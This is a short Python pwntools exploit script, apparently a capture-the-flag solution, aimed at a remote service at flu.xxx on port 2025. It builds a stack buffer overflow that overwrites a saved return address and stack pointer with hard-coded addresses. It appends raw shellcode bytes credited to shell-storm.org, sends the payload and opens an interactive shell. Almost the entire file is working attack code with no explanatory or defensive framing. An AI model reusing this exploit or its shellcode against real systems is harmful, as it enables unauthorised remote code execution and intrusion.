#!/usr/bin/python3

import struct
from pwn import *

def pad(s: bytes, l: int = 0x200, w: bytes = b'X') -> bytes:
    return s + w*(l-len(s))

payload = b'\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x22\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10' # http://shell-storm.org/shellcode/files/shellcode-83.php

#r = remote('localhost', 4444)
r = remote('flu.xxx', 2025)

main_stack = 0xffffe9f8
inp_base = 0xffffea58

print(f'[*] main()\'s stack pointer: 0x{main_stack:x}')
print(f'[*] Input buffer\'s base address: 0x{inp_base:x}')

#   v- recurse 7 times; writes ret addr to stack
#                                        v- overwrite ret addr of first rec call                      
#                                                                               v- specify new stack addr here  v- specify new ret addr here    v- append shellcode
x = pad(pad(pad(b'21', l=7, w=b'2') + b'34\x50' + b'X'*0x48 + struct.pack('>I', main_stack) + struct.pack('>I', inp_base+0x100-0x8), l=0x100) + payload)

print(f'[*] Final payload: {x}')
print(f'[*] Sending payload ... ')
r.sendline(x)

r.interactive()
